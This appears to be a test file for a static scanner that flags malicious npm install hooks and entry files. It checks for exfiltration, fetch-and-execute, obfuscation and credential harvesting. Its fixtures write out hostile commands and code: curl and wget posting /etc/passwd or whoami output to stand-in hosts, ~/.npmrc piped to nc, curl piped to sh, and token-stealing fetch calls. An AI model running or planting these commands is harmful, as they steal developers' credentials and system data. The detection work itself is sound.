// 0.1.5 tarball static checks: static-checks-1.1, the proxy mirror of the ops recon tool's bump (chaingate-ops 9e5caec,
// tools/recon/v6.6/static-checks.mjs; operator rulings 2026-10-15, ops handover section 11; the bump lands in recon first, the proxy
// mirrors it under the SAME version string and marker lists):
//   (A) identity: static-checks-1.1; the five gate names unchanged; the new constants equal to recon's;
//   (N) nothing-read, per row: a file row that read no file although its roles had a candidate (the registry manifest's targets, or
//       npm's default main index.js) is SKIP "no eligible file in the tarball"; S1 without a hook stays ALLOW "no hook target to read";
//   (C0) S0 widened: fetch AND execute (1.0), OR a network tool at a command position AND a "sends" marker (hook-command exfiltration);
//   (C1) S1 oversized hook target: a hook target over the 1 MiB kept-file cap is an S1 WARN of its own (size from the tar header);
//   (C2) S2 numeric hex: >= 1,000 numeric 0x literals is a decode marker (paired with >= 20 _0x identifiers as before);
//   (C3) S3 sink = exfil-host only (raw-ip and post-to-literal-host stay recorded facts, never fire);
//   (W) the walker states the size of an over-cap kept-file target; end to end through the real walker.
// Written failing-first against the static-checks-1.0 proxy (af1f3ec). Fixtures are TEXT shaped like the classes' markers.
import test from 'node:test';
import assert from 'node:assert/strict';
import zlib from 'node:zlib';
import { createTarWalker } from '../../proxy/tar-walk.js';

const SC = () => import('../../proxy/static-checks.js');
const REASON = 'no eligible file in the tarball';

const file = (path, src, extra = {}) => ({ path, buf: Buffer.isBuffer(src) ? src : Buffer.from(src), name: `package/${path}`, platformsNotChecked: [], ...extra });
const walkOf = (files, notKept = []) => ({ ok: true, packageJson: null, views: [], approx: [], files, notKept });
const row = (rows, id) => rows.find((r) => r.gate.startsWith(`static:${id}-`));
const idents = (n) => Array.from({ length: n }, (_, i) => `_0x${(0x1000 + i * 7).toString(16)}`);
const hexLits = (n) => `var t=[${Array.from({ length: n }, (_, i) => `0x${(i * 2654435761 >>> 0).toString(16)}`).join(',')}];\n`;
const OBF_HEX = (ni, nh) => `${idents(ni).map((x, i) => `var ${x}=${i};`).join('')}\n${hexLits(nh)}`;
const HARVEST = 'const fs = require("fs"); const t = fs.readFileSync(require("os").homedir() + "/.npmrc", "utf8");\nfetch("https://webhook.site/aaaa-bbbb", { method: "POST", body: t });\n';
const HARVEST_POST_HOST = 'const tok = process.env.GITHUB_TOKEN;\nfetch("https://collect.example.invalid/in", { method: "POST", body: JSON.stringify({ tok }) });\n';
const HARVEST_RAW_IP = 'const tok = process.env.NPM_TOKEN;\nrequire("http").request("http://10.20.30.40:8080/in", { method: "POST" }).end(tok);\n';
const HOOKED = { name: 'p', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node install.js' } };
const PLAIN = { name: 'p', version: '1.0.0', main: 'index.js' };
const MAIN = file('index.js', 'module.exports = 1;\n');

test('A1 identity: static-checks-1.1, the five gate names UNCHANGED, the new constants as recon v6.6 (numeric-hex limit, nothing-read reason, S0 network tools and sends markers)', async () => {
  const S = await SC();
  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.1');
  assert.deepEqual(S.CHECKS.map((c) => c.gate), ['static:S0-shell-fetch-in-hook', 'static:S1-loader-in-hook-target', 'static:S2-obfuscated-entry', 'static:S3-secret-harvest-with-sink', 'static:S4-wallet-swap-hook']);
  assert.equal(S.LIMITS.s2MinNumericHex, 1000); assert.equal(S.LIMITS.maxKeepBytes, 1 << 20); assert.equal(S.LIMITS.s1MaxBytes, 8192);
  assert.equal(S.NOTHING_READ, REASON);
  assert.deepEqual(S.NET_TOOLS.map(([n]) => n), ['curl', 'wget', 'nc', 'nslookup', 'dig', 'host', 'ping']);
  assert.deepEqual(S.SEND_MARKERS.map(([n]) => n), ['command-substitution', 'data-flag', 'raw-ip-url', 'exfil-host-url']);
  assert.deepEqual(S.DNS_TOOLS, ['nslookup', 'dig', 'host', 'ping']);
});

test('N1 nothing-read: default main absent and no hook -> S2/S3/S4 SKIP "no eligible file in the tarball" naming index.js; S0 and S1 ALLOW', async () => {
  const S = await SC();
  for (const notKept of [[], [{ path: 'index.js', reason: 'not in the archive' }]]) {
    const rows = S.staticRows({ manifest: {}, packageJson: {}, walk: walkOf([], notKept) });
    for (const id of ['S2', 'S3', 'S4']) { const r = row(rows, id); assert.equal(r.result, 'SKIP', `${id} ${r.detail}`); assert.ok(r.detail.startsWith(`not checked: ${REASON} (index.js`), r.detail); }
    assert.equal(row(rows, 'S0').result, 'ALLOW'); assert.equal(row(rows, 'S0').detail, 'no install hook');
    assert.equal(row(rows, 'S1').result, 'ALLOW'); assert.equal(row(rows, 'S1').detail, 'no hook target to read');
  }
  const a = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'not in the archive' }]) }), 'S2');
  assert.equal(a.detail, `not checked: ${REASON} (index.js not in the archive)`);
});

test('N2 nothing-read: a hook target absent -> S1 SKIP with the reason naming install.js; main read -> S2-S4 ALLOW; a cap reason is stated as before, not as nothing-read', async () => {
  const S = await SC();
  const rows = S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([MAIN], [{ path: 'install.js', reason: 'not in the archive' }]) });
  const s1 = row(rows, 'S1'); assert.equal(s1.result, 'SKIP'); assert.equal(s1.detail, `not checked: ${REASON} (install.js not in the archive)`);
  for (const id of ['S2', 'S4']) assert.equal(row(rows, id).result, 'ALLOW', id);
  const over = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'beyond 6 kept files' }]) }), 'S2');
  assert.equal(over.result, 'SKIP'); assert.equal(over.detail, 'not checked: index.js beyond 6 kept files');
  for (const id of ['S0', 'S1', 'S2', 'S3', 'S4']) assert.ok(!row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([MAIN]) }), id).detail.includes(REASON), id);
});

test('C0 S0: a network tool at a command position AND a sends marker fires (hook-command exfiltration); the 1.0 rule still fires; DNS tools need command substitution', async () => {
  const S = await SC();
  const fires = (cmd, tools, sends) => { const r = S.hookFetchExec(cmd); assert.equal(r.fires, true, cmd); assert.deepEqual(r.net_tools, tools, cmd); assert.deepEqual(r.sends, sends, cmd); assert.equal(r.exfil, true, cmd); };
  fires('curl --data-urlencode file=/etc/passwd https://x.example.invalid/in', ['curl'], ['data-flag']);
  fires('curl -d "info=$(hostname && whoami && pwd)" https://x.example.invalid/', ['curl'], ['command-substitution', 'data-flag']);
  fires('wget -q -O/dev/null "http://10.1.2.3/?h=$(hostname)"', ['wget'], ['command-substitution', 'raw-ip-url']);
  fires('wget --post-file=/etc/hosts https://x.example.invalid/in', ['wget'], ['data-flag']);
  fires('curl -F f=@/etc/passwd https://x.example.invalid/', ['curl'], ['data-flag']);
  fires('curl https://webhook.site/abcd', ['curl'], ['exfil-host-url']);
  fires('nslookup $(whoami).abc.oast.fun', ['nslookup'], ['command-substitution']);
  fires('ping -c 1 `hostname`.x.example.invalid', ['ping'], ['command-substitution']);
  fires('node index.js; curl -d @/etc/passwd https://x.example.invalid/', ['curl'], ['data-flag']);
  fires('cat ~/.npmrc | nc $(echo 10.0.0.1) 443', ['nc'], ['command-substitution']);
  const quiet = (cmd) => { const r = S.hookFetchExec(cmd); assert.equal(r.fires, false, cmd); assert.equal(r.exfil, false, cmd); };
  for (const cmd of ['curl -fsSL https://x.example.invalid/releases.json -o rel.json', 'nslookup registry.npmjs.org', 'dig +short example.invalid', 'host example.invalid',
    'echo "built at $(date)"', 'node scripts/host.js --host=0.0.0.0', 'npm run ping -- -d', 'prebuild-install || node-gyp rebuild', 'curl --version || true',
    'nslookup http://10.1.2.3/x', 'node scripts/check.js curl -d x']) quiet(cmd);
  const old = S.hookFetchExec('curl -s https://x.example.invalid/i.sh | sh');
  assert.equal(old.fires, true); assert.deepEqual(old.fetch, ['curl']); assert.deepEqual(old.exec, ['pipe-to-shell']); assert.equal(old.exfil, false);
  assert.equal(S.hookFetchExec(null).fires, false);
});

test('C0b S0 row: the detail names the tool and the sends markers, never the command, URL, host or path; the 1.0 detail is unchanged', async () => {
  const S = await SC();
  const cmd = 'curl --data-urlencode "info=$(hostname && whoami)" https://abc.oast.fun/x';
  const pj = { ...PLAIN, scripts: { postinstall: cmd } };
  const s0 = row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([MAIN]) }), 'S0');
  assert.equal(s0.result, 'WARN');
  assert.equal(s0.detail, 'postinstall command runs a network tool (curl) that sends (command-substitution, data-flag, exfil-host-url)');
  for (const bad of ['oast', 'whoami', 'hostname', 'https://', 'info=']) assert.ok(!s0.detail.includes(bad), bad);
  const both = { ...PLAIN, scripts: { preinstall: 'curl -d x https://webhook.site/a | sh' } };
  assert.equal(row(S.staticRows({ manifest: both, packageJson: both, walk: walkOf([MAIN]) }), 'S0').detail,
    'preinstall command contains a fetch (curl) and an execute (pipe-to-shell) and runs a network tool (curl) that sends (data-flag, exfil-host-url)');
  const old = { ...PLAIN, scripts: { preinstall: 'curl -s https://x.example.invalid/i.sh | sh' } };
  assert.equal(row(S.staticRows({ manifest: old, packageJson: old, walk: walkOf([MAIN]) }), 'S0').detail, 'preinstall command contains a fetch (curl) and an execute (pipe-to-shell)');
});

test('C1 S1: a hook target over the kept-file cap is an S1 WARN (oversized-hook-target, size from the header, body not read); S3 still states it unread; a main over the cap and a hook beyond 6 files are not S1', async () => {
  const S = await SC();
  const nk = [{ path: 'install.js', reason: 'over the kept-file cap (1048576 bytes)', size: 2000000 }];
  const rows = S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([MAIN], nk) });
  const s1 = row(rows, 'S1'); assert.equal(s1.result, 'WARN');
  assert.equal(s1.detail, 'hook target install.js (2000000 B) is over the 1 MiB keep cap: oversized-hook-target, body not read');
  assert.equal(row(rows, 'S3').result, 'SKIP'); assert.match(row(rows, 'S3').detail, /^not checked: install\.js over the kept-file cap/);
  const m = S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'over the kept-file cap (1048576 bytes)', size: 3000000 }]) });
  assert.equal(row(m, 'S1').result, 'ALLOW'); assert.equal(row(m, 'S2').result, 'SKIP');
  const b = row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([MAIN], [{ path: 'install.js', reason: 'beyond 6 kept files' }]) }), 'S1');
  assert.equal(b.result, 'SKIP', 'only the size cap is the oversized signal');
});

test('C2 S2: >= 1,000 numeric 0x literals is the numeric-hex decode marker (with >= 20 _0x identifiers); 999 is not; identifiers alone are not; the count is a recorded fact', async () => {
  const S = await SC();
  const ff = S.fileFacts(file('index.js', OBF_HEX(25, 1000)));
  assert.equal(ff.numeric_hex, 1000, '_0x identifiers are not counted'); assert.ok(ff.decode_markers.includes('numeric-hex'));
  const s2 = (src) => row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', src)]) }), 'S2');
  const a = s2(OBF_HEX(25, 1000)); assert.equal(a.result, 'WARN'); assert.match(a.detail, /25 _0x identifiers and a decode marker \(numeric-hex\)/);
  assert.equal(s2(OBF_HEX(25, 999)).result, 'ALLOW');
  assert.equal(s2(OBF_HEX(19, 5000)).result, 'ALLOW', 'numeric hex alone (a CRC table, a wasm glue file) is not S2');
  assert.equal(S.fileFacts(file('x.js', 'var _0x1a2b=1,_0xffee=2;')).numeric_hex, 0);
  assert.equal(S.fileFacts(file('x.js', 'const a = 0x1F, b = 0XFF; c = 0x;')).numeric_hex, 2);
});

test('C3 S3: the sink is the exfil-host class only; a POST to another literal host or to a raw IP is recorded but does not fire', async () => {
  const S = await SC();
  const s3 = (src, pj = PLAIN, p = 'index.js') => row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([file(p, src)]) }), 'S3');
  const a = s3(HARVEST); assert.equal(a.result, 'WARN'); assert.equal(a.detail, 'index.js (168 B) has a credential source (npmrc) and an outbound sink (exfil-host, post-to-literal-host)');
  assert.equal(s3(HARVEST_POST_HOST).result, 'ALLOW', 'post-to-literal-host alone no longer fires');
  assert.deepEqual(S.fileFacts(file('index.js', HARVEST_POST_HOST)).sinks, ['post-to-literal-host'], 'still a recorded fact');
  assert.equal(s3(HARVEST_RAW_IP).result, 'ALLOW', 'raw-ip alone no longer fires'); assert.ok(S.fileFacts(file('index.js', HARVEST_RAW_IP)).sinks.includes('raw-ip'));
  assert.equal(s3(HARVEST, HOOKED, 'install.js').result, 'WARN', 'hook targets are read for S3');
});

// ---- (W) the real walker: the producer of notKept ----
function hdr(name, size) {
  const h = Buffer.alloc(512, 0);
  Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
  h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1');
  h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i];
  h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1');
  return h;
}
const entry = (name, content) => { const b = Buffer.isBuffer(content) ? content : Buffer.from(content); return [hdr(name, b.length), b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]; };
async function walkTar(parts, keep) {
  const w = createTarWalker({ keep });
  const gz = zlib.gzipSync(Buffer.concat([...parts.flat(), Buffer.alloc(1024, 0)]));
  for (let i = 0; i < gz.length; i += 4096) w.write(gz.subarray(i, i + 4096));
  return w.end();
}

test('W1 walker: an over-cap kept-file target is stated with its size from the tar header; the other reasons carry no size', async () => {
  const big = Buffer.alloc(1536 * 1024, 0x61);
  const r = await walkTar([entry('package/package.json', JSON.stringify(HOOKED)), entry('package/install.js', big), entry('package/index.js', 'x')], ['install.js', 'index.js', 'lib/absent.js']);
  assert.equal(r.ok, true, r.reason);
  assert.deepEqual(r.notKept, [{ path: 'install.js', reason: 'over the kept-file cap (1048576 bytes)', size: 1536 * 1024 }, { path: 'lib/absent.js', reason: 'not in the archive' }]);
});

test('W2 end to end: the real walk of a package whose postinstall target is 1.5 MiB gives S1 WARN oversized-hook-target with the header size', async () => {
  const S = await SC();
  const kl = S.keepListFor(HOOKED);
  const big = Buffer.from(`// ${'x'.repeat(1536 * 1024)}\n`);
  const walk = await walkTar([entry('package/package.json', JSON.stringify(HOOKED)), entry('package/install.js', big), entry('package/index.js', 'module.exports = 1;\n')], kl.paths);
  const rows = S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk });
  const s1 = row(rows, 'S1'); assert.equal(s1.result, 'WARN', s1.detail);
  assert.equal(s1.detail, `hook target install.js (${big.length} B) is over the 1 MiB keep cap: oversized-hook-target, body not read`);
  assert.equal(row(rows, 'S2').result, 'ALLOW');
});
